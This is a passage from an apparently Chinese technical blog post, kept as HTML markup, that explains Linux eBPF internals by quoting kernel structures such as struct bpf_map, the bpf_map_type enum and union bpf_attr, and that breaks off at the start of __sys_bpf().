class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">/* 前两条缓存行带有以读取为主的成员，</span><br><span class="hljs-comment"> * 其中一些也在快速路径中被访问 (e.g. ops, max_entries).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops</span> ____<span class="hljs-title">cacheline_aligned</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">inner_map_meta</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> <span class="hljs-title">map_type</span>;</span><br>u32 key_size;<br>u32 value_size;<br>u32 max_entries;<br>u64 map_extra; <span class="hljs-comment">/* any per-map-type extra fields */</span><br>u32 map_flags;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_record</span> *<span class="hljs-title">record</span>;</span><br><span class="hljs-type">int</span> numa_node;<br>u32 btf_key_type_id;<br>u32 btf_value_type_id;<br>u32 btf_vmlinux_value_type_id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">char</span> name[BPF_OBJ_NAME_LEN];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_field_offs</span> *<span class="hljs-title">field_offs</span>;</span><br><span class="hljs-comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span><br><span class="hljs-comment"> * particularly with refcounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">atomic64_t</span> refcnt ____cacheline_aligned;<br><span class="hljs-type">atomic64_t</span> usercnt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">freeze_mutex</span>;</span><br><span class="hljs-type">atomic64_t</span> writecnt;<br><span class="hljs-comment">/* &#x27;Ownership&#x27; of program-containing map is claimed by the first program</span><br><span class="hljs-comment"> * that is going to use this map or by the first program which FD is</span><br><span class="hljs-comment"> * stored in the map to make sure that all callers and callees have the</span><br><span class="hljs-comment"> * same prog type, JITed flag and xdp_has_frags flag.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-type">bool</span> jited;<br><span class="hljs-type">bool</span> xdp_has_frags;<br>&#125; owner;<br><span class="hljs-type">bool</span> bypass_spec_v1;<br><span class="hljs-type">bool</span> frozen; <span class="hljs-comment">/* write-once; write-protected by freeze_mutex */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="map-类型"><a href="#map-类型" class="headerlink" title="map 类型"></a>map 类型</h3><p>可选 map 类型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> &#123;</span><br>BPF_MAP_TYPE_UNSPEC,<br>BPF_MAP_TYPE_HASH,<br>BPF_MAP_TYPE_ARRAY,<br>BPF_MAP_TYPE_PROG_ARRAY,<br>BPF_MAP_TYPE_PERF_EVENT_ARRAY,<br>BPF_MAP_TYPE_PERCPU_HASH,<br>BPF_MAP_TYPE_PERCPU_ARRAY,<br>BPF_MAP_TYPE_STACK_TRACE,<br>BPF_MAP_TYPE_CGROUP_ARRAY,<br>BPF_MAP_TYPE_LRU_HASH,<br>BPF_MAP_TYPE_LRU_PERCPU_HASH,<br>BPF_MAP_TYPE_LPM_TRIE,<br>BPF_MAP_TYPE_ARRAY_OF_MAPS,<br>BPF_MAP_TYPE_HASH_OF_MAPS,<br>BPF_MAP_TYPE_DEVMAP,<br>BPF_MAP_TYPE_SOCKMAP,<br>BPF_MAP_TYPE_CPUMAP,<br>BPF_MAP_TYPE_XSKMAP,<br>BPF_MAP_TYPE_SOCKHASH,<br>BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-comment">/* BPF_MAP_TYPE_CGROUP_STORAGE is available to bpf programs attaching</span><br><span class="hljs-comment"> * to a cgroup. The newer BPF_MAP_TYPE_CGRP_STORAGE is available to</span><br><span class="hljs-comment"> * both cgroup-attached and other progs and supports all functionality</span><br><span class="hljs-comment"> * provided by BPF_MAP_TYPE_CGROUP_STORAGE. So mark</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_CGROUP_STORAGE deprecated.</span><br><span class="hljs-comment"> */</span><br>BPF_MAP_TYPE_CGROUP_STORAGE = BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br>BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,<br>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE,<br>BPF_MAP_TYPE_QUEUE,<br>BPF_MAP_TYPE_STACK,<br>BPF_MAP_TYPE_SK_STORAGE,<br>BPF_MAP_TYPE_DEVMAP_HASH,<br>BPF_MAP_TYPE_STRUCT_OPS,<br>BPF_MAP_TYPE_RINGBUF,<br>BPF_MAP_TYPE_INODE_STORAGE,<br>BPF_MAP_TYPE_TASK_STORAGE,<br>BPF_MAP_TYPE_BLOOM_FILTER,<br>BPF_MAP_TYPE_USER_RINGBUF,<br>BPF_MAP_TYPE_CGRP_STORAGE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>常用的主要是以下几种类型：</p><ul><li><code>BPF_MAP_TYPE_HASH</code>：以哈希表形式存储键值对，比较常规</li><li><code>BPF_MAP_TYPE_ARRAY</code>：以数组形式存储键值对，<strong>key 即为数组下标，对应的 value 皆初始化为 0</strong></li><li><code>BPF_MAP_TYPE_PROG_ARRAY</code>：特殊的数组映射，<strong>value 为其他 eBPF 程序的文件描述符</strong></li><li><code>BPF_MAP_TYPE_STACK</code>：以栈形式存储数据</li></ul><h3 id="map-wrapper"><a href="#map-wrapper" class="headerlink" title="map wrapper"></a>map wrapper</h3><h1 id="0x02-bpf-系统调用"><a href="#0x02-bpf-系统调用" class="headerlink" title="0x02.bpf 系统调用"></a>0x02.bpf 系统调用</h1><p>我们对 eBPF 所有的操作其实都是通过 <code>bpf</code> 系统调用来完成的，其原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)</span>;<br></code></pre></td></tr></table></figure><h2 id="一、bpf-attr-结构体"><a href="#一、bpf-attr-结构体" class="headerlink" title="一、bpf_attr 结构体"></a>一、bpf_attr 结构体</h2><p>bpf 系统调用中的第二个参数是指向联合体 <code>bpf_attr</code> 的指针，定义于 <code>kernel/bpf/syscall.c</code> 中如下，对于不同的 <code>cmd</code>  而言其含义不同，因此这里是一个由多个结构体构成的联合体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_CREATE 命令所使用的匿名结构体 */</span><br>__u32map_type;<span class="hljs-comment">/* one of enum bpf_map_type */</span><br>__u32key_size;<span class="hljs-comment">/* key 按字节计的大小 */</span><br>__u32value_size;<span class="hljs-comment">/* value 按字节计的大小 */</span><br>__u32max_entries;<span class="hljs-comment">/* map 中最大的 entries 数量 */</span><br>__u32map_flags;<span class="hljs-comment">/* BPF_MAP_CREATE 相关的</span><br><span class="hljs-comment"> * 在上面定义的 flags.</span><br><span class="hljs-comment"> */</span><br>__u32inner_map_fd;<span class="hljs-comment">/* 指向内部 map 的 fd */</span><br>__u32numa_node;<span class="hljs-comment">/* numa node (仅当设置了</span><br><span class="hljs-comment"> * BPF_F_NUMA_NODE 时有效).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span>map_name[BPF_OBJ_NAME_LEN];<br>__u32map_ifindex;<span class="hljs-comment">/* ifindex of netdev to create on */</span><br>__u32btf_fd;<span class="hljs-comment">/* 指向一个 BTF 类型数据的 fd */</span><br>__u32btf_key_type_id;<span class="hljs-comment">/* BTF type_id of the key */</span><br>__u32btf_value_type_id;<span class="hljs-comment">/* BTF type_id of the value */</span><br>__u32btf_vmlinux_value_type_id;<span class="hljs-comment">/* BTF type_id of a kernel-</span><br><span class="hljs-comment">   * struct stored as the</span><br><span class="hljs-comment">   * map value</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">/* Any per-map-type extra fields</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_BLOOM_FILTER - 最低 4 位指示了</span><br><span class="hljs-comment"> * 哈希函数的数量(若为 0, bloom filter 将默认</span><br><span class="hljs-comment"> * 使用 5 个哈希函数).</span><br><span class="hljs-comment"> */</span><br>__u64map_extra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_ELEM 命令所使用的匿名结构体 */</span><br>__u32map_fd;<br>__aligned_u64key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__aligned_u64 value;<br>__aligned_u64 next_key;<br>&#125;;<br>__u64flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_BATCH 命令所使用的匿名结构体 */</span><br>__aligned_u64in_batch;<span class="hljs-comment">/* start batch,</span><br><span class="hljs-comment"> * NULL to start from beginning</span><br><span class="hljs-comment"> */</span><br>__aligned_u64out_batch;<span class="hljs-comment">/* output: next start batch */</span><br>__aligned_u64keys;<br>__aligned_u64values;<br>__u32count;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> * input: # of key/value</span><br><span class="hljs-comment"> * elements</span><br><span class="hljs-comment"> * output: # of filled elements</span><br><span class="hljs-comment"> */</span><br>__u32map_fd;<br>__u64elem_flags;<br>__u64flags;<br>&#125; batch;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_LOAD 命令所使用的匿名结构体 */</span><br>__u32prog_type;<span class="hljs-comment">/* one of enum bpf_prog_type */</span><br>__u32insn_cnt;<br>__aligned_u64insns;<br>__aligned_u64license;<br>__u32log_level;<span class="hljs-comment">/* verbosity level of verifier */</span><br>__u32log_size;<span class="hljs-comment">/* size of user buffer */</span><br>__aligned_u64log_buf;<span class="hljs-comment">/* user supplied buffer */</span><br>__u32kern_version;<span class="hljs-comment">/* not used */</span><br>__u32prog_flags;<br><span class="hljs-type">char</span>prog_name[BPF_OBJ_NAME_LEN];<br>__u32prog_ifindex;<span class="hljs-comment">/* ifindex of netdev to prep for */</span><br><span class="hljs-comment">/* For some prog types expected attach type must be known at</span><br><span class="hljs-comment"> * load time to verify attach type specific parts of prog</span><br><span class="hljs-comment"> * (context accesses, allowed helpers, etc).</span><br><span class="hljs-comment"> */</span><br>__u32expected_attach_type;<br>__u32prog_btf_fd;<span class="hljs-comment">/* fd pointing to BTF type data */</span><br>__u32func_info_rec_size;<span class="hljs-comment">/* userspace bpf_func_info size */</span><br>__aligned_u64func_info;<span class="hljs-comment">/* func info */</span><br>__u32func_info_cnt;<span class="hljs-comment">/* number of bpf_func_info records */</span><br>__u32line_info_rec_size;<span class="hljs-comment">/* userspace bpf_line_info size */</span><br>__aligned_u64line_info;<span class="hljs-comment">/* line info */</span><br>__u32line_info_cnt;<span class="hljs-comment">/* number of bpf_line_info records */</span><br>__u32attach_btf_id;<span class="hljs-comment">/* in-kernel BTF type id to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* valid prog_fd to attach to bpf prog */</span><br>__u32attach_prog_fd;<br><span class="hljs-comment">/* or valid module BTF object fd or 0 to attach to vmlinux */</span><br>__u32attach_btf_obj_fd;<br>&#125;;<br>__u32core_relo_cnt;<span class="hljs-comment">/* number of bpf_core_relo */</span><br>__aligned_u64fd_array;<span class="hljs-comment">/* array of FDs */</span><br>__aligned_u64core_relos;<br>__u32core_relo_rec_size; <span class="hljs-comment">/* sizeof(struct bpf_core_relo) */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_* 命令所使用的匿名结构体 */</span><br>__aligned_u64pathname;<br>__u32bpf_fd;<br>__u32file_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_ATTACH/DETACH 命令所使用的匿名结构体 */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to attach to */</span><br>__u32attach_bpf_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br>__u32attach_type;<br>__u32attach_flags;<br>__u32replace_bpf_fd;<span class="hljs-comment">/* previously attached eBPF</span><br><span class="hljs-comment"> * program to replace if</span><br><span class="hljs-comment"> * BPF_F_REPLACE is used</span><br><span class="hljs-comment"> */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_TEST_RUN 命令所使用的匿名结构体 */</span><br>__u32prog_fd;<br>__u32retval;<br>__u32data_size_in;<span class="hljs-comment">/* input: len of data_in */</span><br>__u32data_size_out;<span class="hljs-comment">/* input/output: len of data_out</span><br><span class="hljs-comment"> *   returns ENOSPC if data_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64data_in;<br>__aligned_u64data_out;<br>__u32repeat;<br>__u32duration;<br>__u32ctx_size_in;<span class="hljs-comment">/* input: len of ctx_in */</span><br>__u32ctx_size_out;<span class="hljs-comment">/* input/output: len of ctx_out</span><br><span class="hljs-comment"> *   returns ENOSPC if ctx_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64ctx_in;<br>__aligned_u64ctx_out;<br>__u32flags;<br>__u32cpu;<br>__u32batch_size;<br>&#125; test;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_*_GET_*_ID 命令所使用的匿名结构体 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32start_id;<br>__u32prog_id;<br>__u32map_id;<br>__u32btf_id;<br>__u32link_id;<br>&#125;;<br>__u32next_id;<br>__u32open_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_GET_INFO_BY_FD 命令所使用的匿名结构体 */</span><br>__u32bpf_fd;<br>__u32info_len;<br>__aligned_u64info;<br>&#125; info;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_QUERY 命令所使用的匿名结构体 */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to query */</span><br>__u32attach_type;<br>__u32query_flags;<br>__u32attach_flags;<br>__aligned_u64prog_ids;<br>__u32prog_cnt;<br><span class="hljs-comment">/* output: per-program attach_flags.</span><br><span class="hljs-comment"> * not allowed to be set during effective query.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64prog_attach_flags;<br>&#125; query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct used by BPF_RAW_TRACEPOINT_OPEN command */</span><br>__u64 name;<br>__u32 prog_fd;<br>&#125; raw_tracepoint;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct for BPF_BTF_LOAD */</span><br>__aligned_u64btf;<br>__aligned_u64btf_log_buf;<br>__u32btf_size;<br>__u32btf_log_size;<br>__u32btf_log_level;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32pid;<span class="hljs-comment">/* input: pid */</span><br>__u32fd;<span class="hljs-comment">/* input: fd */</span><br>__u32flags;<span class="hljs-comment">/* input: flags */</span><br>__u32buf_len;<span class="hljs-comment">/* input/output: buf len */</span><br>__aligned_u64buf;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> *   tp_name for tracepoint</span><br><span class="hljs-comment"> *   symbol for kprobe</span><br><span class="hljs-comment"> *   filename for uprobe</span><br><span class="hljs-comment"> */</span><br>__u32prog_id;<span class="hljs-comment">/* output: prod_id */</span><br>__u32fd_type;<span class="hljs-comment">/* output: BPF_FD_TYPE_* */</span><br>__u64probe_offset;<span class="hljs-comment">/* output: probe_offset */</span><br>__u64probe_addr;<span class="hljs-comment">/* output: probe_addr */</span><br>&#125; task_fd_query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_CREATE command */</span><br>__u32prog_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_fd;<span class="hljs-comment">/* object to attach to */</span><br>__u32target_ifindex; <span class="hljs-comment">/* target ifindex */</span><br>&#125;;<br>__u32attach_type;<span class="hljs-comment">/* attach type */</span><br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_btf_id;<span class="hljs-comment">/* btf_id of target to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__aligned_u64iter_info;<span class="hljs-comment">/* extra bpf_iter_link_info */</span><br>__u32iter_info_len;<span class="hljs-comment">/* iter_info length */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64bpf_cookie;<br>&#125; perf_event;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32flags;<br>__u32cnt;<br>__aligned_u64syms;<br>__aligned_u64addrs;<br>__aligned_u64cookies;<br>&#125; kprobe_multi;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* this is overlaid with the target_btf_id above. */</span><br>__u32target_btf_id;<br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64cookie;<br>&#125; tracing;<br>&#125;;<br>&#125; link_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_UPDATE command */</span><br>__u32link_fd;<span class="hljs-comment">/* link fd */</span><br><span class="hljs-comment">/* new program fd to update link with */</span><br>__u32new_prog_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-comment">/* expected link&#x27;s program fd; is specified only if</span><br><span class="hljs-comment"> * BPF_F_REPLACE flag is set in flags */</span><br>__u32old_prog_fd;<br>&#125; link_update;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32link_fd;<br>&#125; link_detach;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ENABLE_STATS command */</span><br>__u32type;<br>&#125; enable_stats;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ITER_CREATE command */</span><br>__u32link_fd;<br>__u32flags;<br>&#125; iter_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_PROG_BIND_MAP command */</span><br>__u32prog_fd;<br>__u32map_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br>&#125; prog_bind_map;<br><br>&#125; __attribute__((aligned(<span class="hljs-number">8</span>)));<br></code></pre></td></tr></table></figure><h2 id="二、-sys-bpf-：bpf-系统调用的核心函数"><a href="#二、-sys-bpf-：bpf-系统调用的核心函数" class="headerlink" title="二、__sys_bpf()：bpf 系统调用的核心函数"></a>二、__sys_bpf()：bpf 系统调用的核心函数</h2><p>bpf 系统调用定义于 <code>kernel/bpf/syscall.c</code> 中，最终调用到 <code>__sys_bpf()</code> ，其核心主要是一个巨大的 switch，根据 cmd 的不同进行不同的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_bpf(<span class="hljs-type">int</span> cmd, <span class="hljs-type">bpfptr_t</span> uattr, <span class="hljs-type">unsigned</span> 